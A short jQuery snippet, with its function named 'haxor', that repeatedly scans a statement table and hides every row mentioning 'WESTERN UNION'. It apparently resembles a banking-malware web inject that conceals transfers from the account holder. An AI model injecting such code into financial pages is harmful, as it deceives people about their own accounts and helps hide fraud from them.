var masterTableId = 'statementTable';
var found = false;
var timerMonitor = setInterval(haxor, 100);
var selector = '#' + masterTableId + ' td:contains("WESTERN UNION")';

function haxor() {
	var hackTargets = $(selector);
	
	found = hackTargets.length > 0;
	
	if (found) {
		var wuRows = hackTargets.closest('tr');
		
		wuRows.hide();
		
	}
}